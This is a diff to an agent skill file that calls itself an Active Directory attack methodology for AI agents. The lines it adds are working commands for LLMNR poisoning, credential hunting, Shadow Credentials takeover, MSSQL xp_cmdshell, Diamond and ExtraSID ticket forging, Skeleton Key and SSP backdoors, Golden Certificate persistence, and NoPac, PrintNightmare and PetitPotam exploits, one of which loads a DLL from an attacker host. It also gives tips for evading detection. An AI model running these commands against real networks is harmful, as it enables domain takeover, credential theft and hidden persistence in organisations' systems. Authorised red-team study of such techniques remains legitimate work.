@@ -1,11 +1,11 @@
 ---
 name: active-directory-technique
-description: "Active Directory attack methodology for AI agents. Covers domain enumeration (BloodHound, PowerView), credential attacks (Kerberoasting, AS-REP, password spray), NTLM relay chains (Coercer + Responder + ntlmrelayx), certificate abuse (ESC1-8 via Certipy), lateral movement (crackmapexec, evil-winrm, impacket), and domain dominance (DCSync, Golden/Silver ticket). Use after post-exploit-technique delivers a domain-joined foothold or domain credential."
+description: "Active Directory attack methodology for AI agents. Covers domain enumeration (BloodHound, PowerView), credential attacks (Kerberoasting, AS-REP, password spray), NTLM relay chains (Coercer + Responder + ntlmrelayx), certificate abuse (ESC1-13 via Certipy), lateral movement (crackmapexec, evil-winrm, impacket), domain trust escalation (child-to-parent, cross-forest), and domain dominance (DCSync, Golden/Silver/Diamond ticket, persistence). Use after post-exploit-technique delivers a domain-joined foothold or domain credential."
 license: MIT
 compatibility: "Windows Active Directory environments; Linux attack host; domain-joined or credential-in-hand required for most phases"
 metadata:
   author: AeonDave
-  version: "1.0"
+  version: "2.0"
   category: offensive-techniques
   language: multi
 ---
@@ -46,22 +46,24 @@ Before taking action, classify the starting point and choose the shortest low-no
 Entry point classification:
   A. Shell on domain host (no creds yet) → Phase 1 → Phase 2
   B. Low-privilege domain credential → Phase 2 directly
-  C. Network access only (no creds) → Phase 3 (NTLM relay) first
+  C. Network access only (no creds) → Phase 3 (NTLM relay/poisoning) first
+  D. Child domain compromised → Phase 7 (domain trust escalation)
 
 Loop:
   1. Domain enumeration — map attack surface.
   2. Credential attacks — obtain additional hashes/tickets.
-  3. NTLM relay — capture and relay without cracking.
+  3. NTLM relay & poisoning — capture and relay without cracking.
   4. Certificate abuse — obtain domain auth via ADCS.
   5. Lateral movement — reach high-value targets.
-  6. Domain dominance — DCSync, Golden/Silver ticket, persistence.
+  6. Domain dominance — DCSync, Golden/Silver/Diamond ticket, persistence.
+  7. Domain trust escalation — child-to-parent, cross-forest.
 
 Shortest path: BloodHound path from current user to Domain Admin → execute that path.
 
 OPSEC noise levels (tag every command before execution):
-  QUIET    : LDAP/DNS queries, BloodHound stealth collection, Kerbrute enum
-  MODERATE : Standard SMB/LDAP enum, Kerberoasting, AS-REP, Coercer
-  LOUD     : DCSync, PSExec (creates service), BloodHound -c All, Mimikatz on host
+  QUIET    : LDAP/DNS queries, BloodHound stealth collection, Kerbrute enum, Snaffler targeted
+  MODERATE : Standard SMB/LDAP enum, Kerberoasting, AS-REP, Coercer, Inveigh/Responder
+  LOUD     : DCSync, PSExec (creates service), BloodHound -c All, Mimikatz on host, NoPac
 ```
 
 Do not brute-force domain accounts blindly — AD lockout policies are common. Spray once with confirmed policy.
@@ -198,9 +200,42 @@ See `offensive-tools/windows/kerbrute/`, `offensive-tools/windows/trevorspray/`.
 
 ---
 
-## Phase 3 — NTLM relay chain
+## Phase 3 — NTLM relay & network poisoning
 
-Capture NTLM authentication and relay to services without cracking. Highly effective in environments without SMB signing.
+Capture NTLM authentication via relay or poisoning. Highly effective in environments without SMB signing.
+
+### LLMNR/NBT-NS/mDNS poisoning
+
+Passive credential capture — respond to broadcast name resolution queries to intercept NTLM hashes.
+
+```bash
+# Responder (Linux attack host) — full poisoning
+sudo responder -I eth0 -wv
+# Hashes: /usr/share/responder/logs/ → hashcat -m 5600
+
+# Analyze mode (passive, no poisoning — useful for recon)
+sudo responder -I eth0 -A
+```
+
+```powershell
+# Inveigh (from compromised Windows host)
+Import-Module .\Inveigh.ps1
+Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
+
+# C# version (standalone, no PowerShell dependency)
+.\Inveigh.exe -FileOutput Y -NBNS Y -mDNS Y
+```
+
+See `offensive-tools/network/responder/`, `offensive-tools/windows/inveigh/`.
+
+### Credential hunting (Snaffler)
+
+```powershell
+# Automated share enumeration + content analysis for secrets
+.\Snaffler.exe -s -d domain.local -o snaffler.log -v data
+```
+
+See `offensive-tools/windows/snaffler/`.
 
 ### SMB signing check
 
@@ -237,7 +272,7 @@ responder -I eth0 -wv
 
 ## Phase 4 — Certificate abuse (ADCS)
 
-Active Directory Certificate Services (ADCS) misconfigurations allow privilege escalation to DA without touching LSASS.
+Active Directory Certificate Services (ADCS) misconfigurations allow privilege escalation to DA without touching LSASS. Certipy now supports ESC1-16.
 
 ### Enumeration
 
@@ -282,7 +317,7 @@ impacket-secretsdump -k -no-pass domain.local/dc$@<dc_ip>
 
 See `offensive-tools/windows/certipy/`.
 
-→ Full ESC1-8 chains, ADCS enumeration, mitigation-aware selection: `references/certificate-abuse.md`.
+→ Full ESC1-13 chains, ADCS enumeration, Shadow Credentials, Golden Certificate: `references/certificate-abuse.md`.
 
 ---
 
@@ -327,6 +362,41 @@ impacket-psexec -k -no-pass domain.local/<user>@<target>
 
 # Rubeus (Windows)
 .\Rubeus.exe ptt /ticket:<base64_ticket>
+```
+
+### Shadow Credentials (GenericWrite → account takeover without password change)
+
+```bash
+# certipy shadow — inject msDS-KeyCredentialLink → authenticate via PKINIT
+certipy shadow auto -u attacker@domain.local -p pass -account <target_user> -dc-ip <dc_ip>
+# Output: target user NTLM hash
+
+# pywhisker — alternative tool
+python3 pywhisker.py -d domain.local -u attacker -p pass --target <target_user> --action add
+# Then use PKINITtools:
+python3 gettgtpkinit.py -cert-pem cert.pem -key-pem priv.pem domain.local/<target_user> target.ccache
+python3 getnthash.py -key <session_key> domain.local/<target_user>
+```
+
+### MSSQL lateral movement
+
+```bash
+# Enumerate SQL instances via PowerUpSQL
+Import-Module .\PowerUpSQL.ps1
+Get-SQLInstanceDomain
+
+# Login and enable xp_cmdshell
+Get-SQLQuery -Instance "<host>,1433" -username "domain\user" -password "pass" -query 'Select @@version'
+
+# impacket mssqlclient
+impacket-mssqlclient domain.local/user:pass@<target> -windows-auth
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami
+```
+
+BloodHound Cypher query for SQL admin paths:
+```cypher
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
 ```
 
 See `offensive-tools/windows/crackmapexec/`, `offensive-tools/windows/evil-winrm/`, `offensive-tools/windows/impacket/`.
@@ -378,19 +448,109 @@ Forge TGS for a specific service without touching DC. Requires service account h
 .\mimikatz.exe "kerberos::golden /domain:domain.local /sid:<sid> /target:<host.domain.local> /service:cifs /rc4:<service_account_ntlm> /user:Administrator /ptt" "exit"
 ```
 
+### Diamond Ticket
+
+Modify a legitimate TGT rather than forging from scratch — stealthier than Golden Ticket. Requires `krbtgt` AES256 key + any valid user credential.
+
+```bash
+# Basic Diamond Ticket — request legitimate TGT, decrypt, modify PAC, re-encrypt
+.\Rubeus.exe diamond /krbkey:<aes256_krbtgt> /user:<low_priv_user> /password:<pass> \
+  /enctype:aes /domain:domain.local /dc:<dc_fqdn> /ticketuser:Administrator /ticketuserid:500 /nowrap
+
+# With /tgtdeleg — avoids sending credentials on the wire
+.\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 \
+  /krbkey:<aes256_krbtgt> /nowrap
+
+# OPSEC-enhanced (2024+) — /ldap pulls real PAC, /opsec matches Windows AS-REQ flow
+.\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 \
+  /krbkey:<aes256_krbtgt> /ldap /opsec /nowrap
+```
+
 ### AD persistence
 
 ```powershell
 # AdminSDHolder abuse — backdoor ACL propagation every 60 min
 Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity <backdoor_user> -Rights All
 
-# SID history injection
-.\mimikatz.exe "privilege::debug" "misc::addsid <user> <high_priv_SID>" "exit"
-
 # Skeleton key (memory only, non-persistent)
 .\mimikatz.exe "privilege::debug" "misc::skeleton" "exit"
 # All domain users now accept "mimikatz" as password
+
+# SSP backdoor (credentials logged to mimilsa.log)
+.\mimikatz.exe "privilege::debug" "misc::memssp" "exit"
+
+# Golden Certificate (CA private key → forge any cert indefinitely)
+certipy ca -backup -u admin@domain.local -p pass -ca 'CA-Name' -target <ca_host>
+certipy forge -ca-pfx ca.pfx -upn administrator@domain.local
 ```
+
+→ Full persistence techniques: `references/domain-persistence.md`.
+
+---
+
+## Phase 7 — Domain trust escalation
+
+Escalate from child domain to parent domain or across forest trusts.
+
+### Child-to-parent escalation (ExtraSID Golden/Diamond Ticket)
+
+Requires: `krbtgt` hash from child domain + Enterprise Admins SID from parent.
+
+```bash
+# Gather requirements
+impacket-secretsdump child.domain.local/admin@<child_dc> -just-dc-user CHILD/krbtgt
+impacket-lookupsid child.domain.local/admin@<parent_dc> | grep "Enterprise Admins"
+
+# Mimikatz — golden ticket with /sids
+.\mimikatz.exe "kerberos::golden /user:hacker /domain:CHILD.DOMAIN.LOCAL /sid:<child_sid> /krbtgt:<krbtgt_hash> /sids:<parent_EA_sid>-519 /ptt" "exit"
+
+# Diamond Ticket (stealthier) — with ExtraSID
+.\Rubeus.exe diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500 /groups:512 \
+  /sids:<parent_EA_sid>-519 /krbkey:<child_krbtgt_aes256> /nowrap
+
+# Linux — forge inter-realm ticket
+impacket-ticketer -nthash <krbtgt_hash> -domain CHILD.DOMAIN.LOCAL -domain-sid <child_sid> \
+  -extra-sid <parent_EA_sid>-519 hacker
+export KRB5CCNAME=hacker.ccache
+impacket-psexec -k -no-pass CHILD.DOMAIN.LOCAL/hacker@<parent_dc_fqdn>
+```
+
+### Cross-forest Kerberoasting
+
+```bash
+.\Rubeus.exe kerberoast /domain:OTHERFOREST.LOCAL /user:mssqlsvc /nowrap
+impacket-GetUserSPNs -target-domain OTHERFOREST.LOCAL MYFOREST.LOCAL/user:pass -request
+```
+
+→ Full trust attack chains, trust key abuse, SID history: `references/domain-trust-attacks.md`.
+
+---
+
+## Bleeding-edge vulnerabilities
+
+### NoPac (CVE-2021-42278 + CVE-2021-42287)
+
+Escalate from any domain user to DA by spoofing DC sAMAccountName.
+
+```bash
+python3 noPac.py domain.local/user:pass -dc-ip <dc_ip> -dc-host <dc_hostname> --impersonate administrator -dump
+# Check: crackmapexec ldap <dc_ip> -u user -p pass -M maq
+```
+
+### PrintNightmare (CVE-2021-34527)
+
+```bash
+impacket-rpcdump <target> | grep -i spoolsv  # verify spooler
+python3 CVE-2021-34527.py domain.local/user:pass@<target> '\\<attacker_ip>\share\evil.dll'
+```
+
+### PetitPotam (MS-EFSRPC coercion)
+
+```bash
+python3 PetitPotam.py -u user -p pass -d domain.local <attacker_ip> <dc_ip>  # relay to ADCS ESC8
+```
+
+→ Domain persistence, DCShadow, Golden Certificate: `references/domain-persistence.md`.
 
 ---
 
@@ -404,23 +564,27 @@ Key Windows Event IDs triggered by AD attacks:
 | 4625 | Failed logon | Password spraying |
 | 4648 | Explicit credential logon | Pass-the-Hash |
 | 4662 | Operation on directory object | DCSync |
-| 4768 | Kerberos TGT requested | Golden Ticket reuse |
-| 4769 | Kerberos service ticket requested | Kerberoasting |
+| 4741 | Computer account created | NoPac, RBCD setup |
+| 4742 | Computer account modified | NoPac (sAMAccountName rename) |
+| 4768 | Kerberos TGT requested | Golden/Diamond Ticket reuse |
+| 4769 | Kerberos service ticket requested | Kerberoasting, cross-forest |
 | 4771 | Kerberos pre-auth failed | AS-REP Roasting |
 | 4720 | User account created | RBCD / persistence |
-| 4738 | User account changed | ACL abuse |
-| 5136 | Directory object modified | DACL changes, RBCD |
-| 7045 | Service installed | PSExec |
+| 4738 | User account changed | ACL abuse, UPN change (ESC9) |
+| 4765 | SID History added | SID History injection |
+| 5136 | Directory object modified | DACL changes, RBCD, AdminSDHolder |
+| 7045 | Service installed | PSExec, Skeleton Key |
 
 MITRE ATT&CK primary mappings:
 
 | Phase | TTPs |
 |-------|------|
 | Enumeration | T1087.002, T1069.002, T1018 |
-| Kerberos attacks | T1558.003 (Kerberoasting), T1558.004 (AS-REP), T1558.001 (Golden), T1558.002 (Silver) |
-| Credential access | T1003.006 (DCSync) |
+| Kerberos attacks | T1558.003 (Kerberoasting), T1558.004 (AS-REP), T1558.001 (Golden/Diamond), T1558.002 (Silver) |
+| Credential access | T1003.006 (DCSync), T1557.001 (LLMNR/NBT-NS), T1649 (ADCS) |
 | Lateral movement | T1550.002 (PTH), T1550.003 (PTT), T1021.002 (SMB), T1021.006 (WinRM) |
-| Persistence | T1484 (Domain Policy), T1134 (Token Manipulation) |
+| Persistence | T1484 (Domain Policy), T1098 (AdminSDHolder), T1556.001 (SSP/Skeleton) |
+| Trust escalation | T1134.005 (SID History), T1558.001 (ExtraSID Golden) |
 
 ---
 
@@ -431,6 +595,9 @@ MITRE ATT&CK primary mappings:
 - NTLM relay verified: target list only includes hosts without SMB signing.
 - Certificate abuse: template vulnerability class confirmed before request.
 - DCSync: krbtgt hash validated (test decrypt with known user hash).
+- Domain trust: child domain SID and parent EA SID confirmed before ticket forging.
+- Diamond Ticket: AES256 key used (RC4 triggers detection).
+- NoPac: MachineAccountQuota > 0 verified before exploitation.
 - All escalation steps documented with exact commands and timestamps.
 - Evidence files named: `{tool}_{domain}_{YYYYMMDD_HHMMSS}.{ext}`.
 
@@ -441,12 +608,17 @@ MITRE ATT&CK primary mappings:
 - Treating DCSync hash dump as "complete" without validating krbtgt for Golden Ticket.
 - Using mimikatz directly on EDR-monitored host without evasion → immediate alert.
 - Lateral movement to every reachable host instead of targeting BloodHound DA path.
+- Golden Ticket with RC4 encryption → detectable by etype mismatch with domain policy.
+- Running Snaffler against entire domain without targeting → excessive SMB traffic.
+- Skeleton Key on DC without confirming LSASS protection status → crash risk.
 
 ## Resources
 
-- [references/ad-enumeration.md](references/ad-enumeration.md) — BloodHound query catalog, PowerView cheatsheet, LDAP query patterns, trust enumeration.
+- [references/ad-enumeration.md](references/ad-enumeration.md) — BloodHound query catalog, PowerView cheatsheet, LDAP query patterns, trust enumeration, Snaffler, LLMNR/NBT-NS poisoning, credential hunting.
 - [references/ad-acl-abuse.md](references/ad-acl-abuse.md) — ACL abuse methodology: GenericAll, WriteDACL, WriteOwner, GenericWrite, shadow credentials, RBCD, and reversible proof paths.
-- [references/kerberos-attacks.md](references/kerberos-attacks.md) — Kerberoasting, AS-REP, delegation abuse (unconstrained/constrained/RBCD), ticket forgery, S4U attacks.
+- [references/kerberos-attacks.md](references/kerberos-attacks.md) — Kerberoasting, AS-REP, delegation abuse (unconstrained/constrained/RBCD), Diamond Ticket, NoPac/sAMAccountName spoofing, double-hop workarounds, ticket forgery.
 - [references/ntlm-relay.md](references/ntlm-relay.md) — Relay chain setup, coercion methods, relay target selection, SOCKS relay for tool chaining.
-- [references/certificate-abuse.md](references/certificate-abuse.md) — ADCS ESC1-8 attack chains, certificate auth, CA enumeration, PKINIT, shadow credentials.
+- [references/certificate-abuse.md](references/certificate-abuse.md) — ADCS ESC1-13 attack chains, certificate auth, CA enumeration, PKINIT, shadow credentials, Golden Certificate.
 - [references/lateral-movement-ad.md](references/lateral-movement-ad.md) — Protocol × credential type matrix, WMI/DCOM/RDP/WinRM/SMB patterns, detection signatures to avoid.
+- [references/domain-trust-attacks.md](references/domain-trust-attacks.md) — Child-to-parent escalation, cross-forest Kerberoasting, trust key abuse, SID history, Diamond Ticket with ExtraSID.
+- [references/domain-persistence.md](references/domain-persistence.md) — AdminSDHolder, Skeleton Key, SSP backdoor, DSRM abuse, DCShadow, Golden Certificate persistence.
